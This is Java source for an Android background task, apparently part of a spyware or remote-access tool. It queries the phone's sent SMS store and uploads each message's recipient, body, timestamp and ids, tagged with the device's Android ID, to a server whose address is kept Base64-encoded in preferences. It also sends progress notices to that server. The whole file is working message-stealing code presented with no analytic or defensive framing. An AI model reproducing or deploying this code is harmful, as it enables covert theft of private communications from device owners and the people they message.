package com.asynctask;

import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.util.Base64;

import com.connect.MyApplication;
import com.utils.CommonUtils;

import java.io.UnsupportedEncodingException;
import java.text.SimpleDateFormat;
import java.util.Calendar;

/**
 * Created by ASUS on 2017/12/5.
 */

public class getSentSms extends AsyncTask<String, Void, String> {
    String j = "";

    public getSentSms(String j) {
        this.j = j;
    }

    @Override
    protected String doInBackground(String... params) {
        Uri callUri = Uri.parse("content://sms/sent");
        Cursor mCur = MyApplication.getContext().getContentResolver().query(callUri, null, null, null, null);
        if (mCur.moveToFirst()) {
            int i = 0;
            while (mCur.isAfterLast() == false) {
                if (i < Integer.parseInt(j)) {
//	                Log.i("com.connect", "Address: " + mCur.getString(mCur.getColumnIndex("address")));
//	                Log.i("com.connect", "Message: " + mCur.getString(mCur.getColumnIndex("body")));

                    SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd*hh:mm:ss");
                    Calendar calendar = Calendar.getInstance();
                    String now = mCur.getString(mCur.getColumnIndex("date"));
                    calendar.setTimeInMillis(Long.parseLong(now));
//	                Log.i("com.connect", "Date: " + formatter.format(calendar.getTime()));
                    String thread_id = mCur.getString(mCur.getColumnIndex("thread_id"));
                    String id = mCur.getString(mCur.getColumnIndex("_id"));

//	                Log.i("com.connect", "thread_id " + thread_id);
//	                Log.i("com.connect", "id " + id);

                    try {
                        String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
                        CommonUtils.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", "[" + formatter.format(calendar.getTime()).replace(' ', '*') + "] [" + thread_id + "] " + "[" + id + "] " + "[" + mCur.getString(mCur.getColumnIndex("address")).replace(' ', '*') + "] " + mCur.getString(mCur.getColumnIndex("body")).replace(' ', '*'));
                    } catch (UnsupportedEncodingException e) {

                        e.printStackTrace();
                    }

                }
                i++;
                mCur.moveToNext();
            }
        }
        mCur.close();

        return "Executed";
    }

    @Override
    protected void onPostExecute(String result) {
        PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).edit().putBoolean("Get", false).commit();
        try {
            String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
            CommonUtils.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", "Sent SMS Complete");
        } catch (UnsupportedEncodingException e) {

            e.printStackTrace();
        }
    }

    @Override
    protected void onPreExecute() {
        while (PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getBoolean("Get", false) == true) {
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        try {
            String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
            CommonUtils.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", "Getting Sent SMS");
        } catch (UnsupportedEncodingException e) {

            e.printStackTrace();
        }
        PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).edit().putBoolean("Get", true).commit();
    }

    @Override
    protected void onProgressUpdate(Void... values) {
    }
}

